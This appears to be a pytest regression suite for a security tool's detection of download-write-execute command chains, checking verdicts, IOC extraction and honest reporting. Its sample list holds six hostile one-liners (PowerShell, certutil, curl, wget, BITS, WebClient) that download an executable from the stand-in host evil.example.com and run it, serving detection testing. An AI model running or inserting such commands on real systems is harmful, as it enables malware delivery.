"""Behaviour-chain correlation · targeted regression suite.

Locks in the generic Download → Write → Execute detection that must
be command-agnostic: any download primitive combined with any
execution primitive must fire ``remote_execution`` and yield a
MALICIOUS verdict with the destination filename surfaced as a File
IOC and the honesty statement about the un-analysed payload.
"""
from __future__ import annotations

import pytest

from v2.investigation.intent.rules._chain import (
    find_download_destinations,
    is_invoked,
)
from v2.investigation.pipeline import investigate


CHAIN_SAMPLES = [
    ("iwr_outfile_startprocess",
     'Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe; Start-Process a.exe'),
    ("certutil_start",
     'certutil.exe -urlcache -split -f http://evil.example.com/a.exe C:\\Users\\Public\\a.exe && start C:\\Users\\Public\\a.exe'),
    ("curl_bare_invocation",
     'curl http://evil.example.com/a.exe -o a.exe && a.exe'),
    ("wget_call_operator",
     'wget http://evil.example.com/a.exe -O a.exe; & a.exe'),
    ("bits_invoke_item",
     'Start-BitsTransfer -Source http://evil.example.com/a.exe -Destination a.exe; Invoke-Item a.exe'),
    ("webclient_downloadfile",
     '(New-Object Net.WebClient).DownloadFile("http://evil.example.com/a.exe","a.exe"); Start-Process "a.exe"'),
]


@pytest.mark.parametrize("label,sample", CHAIN_SAMPLES, ids=[s[0] for s in CHAIN_SAMPLES])
def test_download_execute_chain_is_malicious(label, sample):
    r = investigate(sample)
    fired = {i.category.value for i in r.intent.intents}
    assert "staging" in fired, f"{label}: staging must fire"
    assert "remote_execution" in fired, f"{label}: remote_execution must fire"
    assert r.verdict.band.value == "malicious", (
        f"{label}: chain must be malicious, got {r.verdict.band.value}"
    )
    assert r.verdict.confidence >= 90, (
        f"{label}: chain confidence must be >= 90, got {r.verdict.confidence}"
    )


@pytest.mark.parametrize("label,sample", CHAIN_SAMPLES, ids=[s[0] for s in CHAIN_SAMPLES])
def test_chain_surfaces_file_ioc(label, sample):
    r = investigate(sample)
    files = {i.value for i in r.report.iocs if i.kind == "file"}
    assert any("a.exe" in f for f in files), (
        f"{label}: destination file IOC not surfaced (got {sorted(files)})"
    )


@pytest.mark.parametrize("label,sample", CHAIN_SAMPLES, ids=[s[0] for s in CHAIN_SAMPLES])
def test_chain_surfaces_domain_ioc(label, sample):
    r = investigate(sample)
    domains = {i.value for i in r.report.iocs if i.kind == "domain"}
    assert "evil.example.com" in domains, (
        f"{label}: host must be surfaced as a domain IOC (got {sorted(domains)})"
    )


@pytest.mark.parametrize("label,sample", CHAIN_SAMPLES, ids=[s[0] for s in CHAIN_SAMPLES])
def test_chain_reports_analyst_friendly_behaviors(label, sample):
    r = investigate(sample)
    joined = " || ".join(b["purpose"].lower() for b in r.report.observed_behaviors)
    assert "downloads executable" in joined, f"{label}: missing 'downloads executable' narrative"
    assert "writes executable"    in joined, f"{label}: missing 'writes executable' narrative"
    assert "executes downloaded"  in joined, f"{label}: missing 'executes downloaded' narrative"


@pytest.mark.parametrize("label,sample", CHAIN_SAMPLES, ids=[s[0] for s in CHAIN_SAMPLES])
def test_chain_admits_downloaded_payload_unknown(label, sample):
    r = investigate(sample)
    joined = " || ".join(u.lower() for u in r.report.unknowns)
    assert "downloaded executable was not analyzed" in joined, (
        f"{label}: report must admit that the downloaded payload was not analysed"
    )


@pytest.mark.parametrize("label,sample", CHAIN_SAMPLES, ids=[s[0] for s in CHAIN_SAMPLES])
def test_chain_never_attributes_malware_family(label, sample):
    """Zero tolerance — no report may name a specific malware family
    just because a download-and-execute chain was observed."""
    r = investigate(sample)
    text = (
        r.report.executive_summary + " "
        + " ".join(b["purpose"] for b in r.report.observed_behaviors)
        + " " + " ".join(u for u in r.report.unknowns)
        + " " + " ".join(
            rec.action + " " + rec.rationale for rec in r.report.recommendations
        )
    ).lower()
    for word in ("family", "cobalt strike", "empire", "meterpreter",
                  "ransomware family", "downloader family"):
        assert word not in text, (
            f"{label}: report leaked unsupported family / campaign phrase `{word}`"
        )


def test_download_only_stays_suspicious_not_malicious():
    """Honesty gate — a download without an execution primitive on the
    same file must NOT be escalated to malicious."""
    r = investigate(
        'Invoke-WebRequest -Uri "https://update.example.com/patch.exe" '
        '-OutFile "$env:TEMP\\patch.exe"'
    )
    fired = {i.category.value for i in r.intent.intents}
    assert "staging" in fired
    assert "remote_execution" not in fired
    assert r.verdict.band.value == "suspicious", (
        f"download-only sample must stay suspicious, got {r.verdict.band.value}"
    )


def test_find_download_destinations_covers_all_downloaders():
    """The shared helper must recognise every downloader we claim to
    support so intent and IOC extraction stay in lock-step."""
    text = (
        "Invoke-WebRequest -Uri http://x/a.exe -OutFile a.exe;\n"
        "(New-Object Net.WebClient).DownloadFile('http://x/b.exe','b.exe');\n"
        "certutil.exe -urlcache -split -f http://x/c.exe c.exe;\n"
        "bitsadmin /transfer job http://x/d.exe d.exe;\n"
        "curl http://x/e.exe -o e.exe;\n"
        "wget http://x/f.exe -O f.exe;\n"
    )
    dests = {d.origin: d.base for d in find_download_destinations(text)}
    assert dests.get("parameter")    == "a.exe"
    assert dests.get("downloadfile") == "b.exe"
    assert dests.get("certutil")     == "c.exe"
    assert dests.get("bitsadmin")    == "d.exe"
    assert dests.get("curl")         == "e.exe"
    assert dests.get("wget")         == "f.exe"


def test_is_invoked_recognises_every_executor_form():
    """Every supported executor form must trigger ``is_invoked`` so the
    behaviour-chain rule fires regardless of the interpreter used."""
    for form in [
        "; a.exe",              # bare invocation after separator
        "&& a.exe",             # cmd chain
        "; Start-Process a.exe",
        "; Invoke-Item a.exe",
        "start a.exe",          # cmd builtin
        "cmd /c a.exe",
        "; & a.exe",            # PS call operator
        "; & 'a.exe'",          # quoted PS call operator
    ]:
        hit, _ = is_invoked("prefix " + form, "a.exe")
        assert hit, f"is_invoked failed to recognise executor form: {form!r}"


def test_chain_does_not_fire_on_downloader_self_reference():
    """The downloader binary itself (e.g. ``certutil.exe``) must not
    be treated as the executed downloaded payload — that would
    over-claim the chain on plain download samples."""
    r = investigate(
        'certutil.exe -urlcache -split -f https://update.example.com/patch.exe '
        '"$env:TEMP\\patch.exe"'
    )
    fired = {i.category.value for i in r.intent.intents}
    assert "remote_execution" not in fired, (
        "certutil download without a follow-up invocation must NOT fire "
        "remote_execution (that would over-claim the behaviour chain)"
    )
